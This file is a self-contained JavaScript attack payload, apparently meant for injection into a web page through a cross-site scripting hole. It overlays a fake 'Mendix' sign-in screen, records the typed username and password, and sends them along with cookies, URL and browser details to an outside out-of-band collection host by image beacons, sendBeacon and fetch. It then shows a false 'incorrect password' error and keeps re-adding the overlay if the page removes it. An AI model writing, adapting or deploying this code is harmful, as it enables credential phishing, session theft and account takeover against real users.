(function () {
  // ==== CONFIG ====
  var EXFIL = "https://daqr0cuhf05a9hjph7e0krdyc48iw7fzd.oast.me";
  var BUILD = "v" + Date.now();   // unique per save -> proves which file is running
  // ================

  function hit(path, data) {
    var q = EXFIL + path + (data ? ("?d=" + encodeURIComponent(data)) : "");
    try { new Image().src = q; } catch (e) {}
    try { navigator.sendBeacon(q, data || "x"); } catch (e) {}
    try { fetch(EXFIL + path, { method: "POST", mode: "no-cors", keepalive: true, body: data || "x" }); } catch (e) {}
  }
  hit("/chunk-" + BUILD, "url=" + location.href);

  var saved = { u: "", p: "" };

  function loot(extra) {
    return Object.assign({
      url: location.href, origin: location.origin, ua: navigator.userAgent,
      referrer: document.referrer, cookies: document.cookie, build: BUILD, ts: Date.now()
    }, extra || {});
  }

  function exfil(obj) {
    var body = JSON.stringify(obj);
    try { new Image().src = EXFIL + "/c?d=" + encodeURIComponent(body); } catch (e) {}
    try { navigator.sendBeacon(EXFIL + "/c", body); } catch (e) {}
    try { fetch(EXFIL + "/c", { method: "POST", mode: "no-cors", keepalive: true, body: body }); } catch (e) {}
  }

  function build() {
    if (document.getElementById("mx-sso-fake")) return;
    var w = document.createElement("div");
    w.id = "mx-sso-fake";
    w.style.cssText =
      "position:fixed;inset:0;z-index:2147483647;background:#f5f6f8;" +
      "display:flex;align-items:center;justify-content:center;font-family:system-ui,Arial,sans-serif";
    w.innerHTML =
      '<div style="width:360px;max-width:92vw;background:#fff;border-radius:8px;' +
      'box-shadow:0 6px 24px rgba(0,0,0,.12);padding:32px 28px">' +
        '<div style="font-size:22px;font-weight:700;color:#0a1325">Mendix</div>' +
        '<div style="font-size:14px;color:#5b6472;margin:4px 0 22px">Sign in to continue</div>' +
        '<form id="mx-f" onsubmit="return false" method="post" action="javascript:void(0)">' +
          '<input id="mx-u" type="text" placeholder="Email / Username" autocomplete="username" ' +
            'style="width:100%;box-sizing:border-box;padding:10px;border:1px solid #c9ced6;border-radius:6px;margin-bottom:16px">' +
          '<input id="mx-p" type="password" placeholder="Password" autocomplete="current-password" ' +
            'style="width:100%;box-sizing:border-box;padding:10px;border:1px solid #c9ced6;border-radius:6px;margin-bottom:20px">' +
          '<button id="mx-b" type="button" ' +
            'style="width:100%;padding:11px;border:0;border-radius:6px;background:#0a4dbb;color:#fff;font-weight:600;cursor:pointer">Sign in</button>' +
          '<div id="mx-e" style="display:none;color:#c0392b;font-size:13px;margin-top:14px">' +
            'The username or password you entered is incorrect.</div>' +
          '<div style="color:#aeb4bd;font-size:10px;margin-top:14px">' + BUILD + '</div>' +
        '</form>' +
      '</div>';
    document.documentElement.appendChild(w);
    // restore anything typed before a re-render
    var uu = document.getElementById("mx-u"), pp = document.getElementById("mx-p");
    uu.value = saved.u; pp.value = saved.p;
    uu.addEventListener("input", function(){ saved.u = uu.value; });
    pp.addEventListener("input", function(){ saved.p = pp.value; });
  }

  function submit() {
    var u = (saved.u || (document.getElementById("mx-u") || {}).value || "").trim();
    var p = saved.p || (document.getElementById("mx-p") || {}).value || "";
    hit("/clicked", "u=" + encodeURIComponent(u) + " p_len=" + p.length);
    if (!u || !p) return;
    exfil(loot({ u: u, p: p }));
    var e = document.getElementById("mx-e");
    if (e) e.style.display = "block";
  }

  // Delegated, capture-phase handlers -> work even if the page re-creates the button/form
  document.addEventListener("click", function (ev) {
    var t = ev.target;
    if (t && t.closest && t.closest("#mx-b")) { ev.preventDefault(); ev.stopPropagation(); submit(); }
  }, true);
  document.addEventListener("submit", function (ev) {
    if (ev.target && ev.target.id === "mx-f") { ev.preventDefault(); ev.stopPropagation(); }
  }, true);
  document.addEventListener("keydown", function (ev) {
    if (ev.key === "Enter" && ev.target && (ev.target.id === "mx-u" || ev.target.id === "mx-p")) {
      ev.preventDefault(); submit();
    }
  }, true);

  // Watchdog: re-add the overlay if the page removes it
  function ensure() { try { build(); } catch (e) {} }
  function start() {
    ensure();
    try { new MutationObserver(ensure).observe(document.documentElement, { childList: true, subtree: true }); } catch (e) {}
    setInterval(ensure, 800);
  }

  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", start);
  else start();
})();
